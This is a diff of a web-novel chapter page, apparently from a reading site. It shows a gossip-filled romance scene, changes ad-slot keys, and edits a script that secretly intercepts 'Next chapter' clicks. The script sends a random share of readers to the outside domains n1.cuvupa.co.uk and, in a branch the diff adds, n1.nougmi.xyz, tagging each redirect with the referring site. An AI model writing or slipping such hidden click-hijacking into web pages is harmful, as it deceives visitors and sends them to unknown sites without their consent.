@@ -2390,27 +2390,27 @@
                 <p>&#34;That&#39;s a lie!&#34; Yvonne stomped her foot angrily. &#34;It&#39;s just hyperpigmentation from pregnancy! Those gossipmongers are spreading rumors—I&#39;ll sue them into bankruptcy!&#34;</p>
                 <p>&#34;Pfft—&#34; Vivian burst out laughing. &#34;So it&#39;s hyperpigmentation?&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>&#34;Exactly! Annabelle has always loved coffee, so her skin is prone to darkening. She might look fair now, but she was quite dark as a child. She only got lighter after getting whitening injections abroad.&#34;</p>
                 <p>Vivian doubled over with laughter. &#34;Evelyn, did you hear that? What a bombshell!&#34;</p>
                 <p>&#34;What&#39;s so funny?&#34; Yvonne glared. &#34;There&#39;s nothing wrong with whitening injections! That &#39;baby&#39; is just pigmentation. If you keep slandering Annabelle, I won&#39;t let you off!&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>&#34;Miss Young,&#34; Vivian wiped tears of laughter. &#34;How can you be so sure it&#39;s pigmentation?&#34;</p>
                 <p>&#34;Because... Mmmph!&#34;</p>
                 <p>Annabelle frantically covered Yvonne&#39;s mouth, shooting her warning looks.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>Yvonne pulled her hand away. &#34;Annabelle, the more you tolerate, the more they&#39;ll bully you! Today, I&#39;m setting the record straight!&#34;</p>
                 <p>&#34;Yvonne! Let&#39;s go eat—&#34;</p>
                 <p>&#34;No!&#34; Yvonne turned to Alexander Hamilton. &#34;Mr. Hamilton, Grandma Hamilton&#39;s death was an accident. Annabelle only went to deliver food—who could&#39;ve predicted this? You can&#39;t blame her entirely!&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>Vincent and Nathan York exchanged glances—one pulling Yvonne back, the other covering her mouth.</p>
                 <p>&#34;Please, for heaven&#39;s sake, stop talking...&#34;</p>
                 <p>&#34;Vincent Wilson! How dare you stop me?&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Vincent looked like he wanted to cry. &#34;Hit me somewhere else, okay? I won&#39;t fight back...&#34;</p>
                 <p>&#34;Aww,&#34; Vivian teased. &#34;So rough with your ex, Vincent? Let her finish.&#34;</p>
                 <p>&#34;Exactly!&#34; Yvonne kicked Vincent hard and broke free.</p>
@@ -2418,7 +2418,7 @@
                 <p>Vivian shrugged. &#34;Suit yourself.&#34;</p>
                 <p>Yvonne turned to Alexander, her tone pleading. &#34;Alex, the baby thing is a misunderstanding. Annabelle loves you so much—you can&#39;t doubt her just because of skin discoloration.&#34;</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
             </div>
             
             <div class="font-controls">
@@ -2540,7 +2540,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2556,8 +2556,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
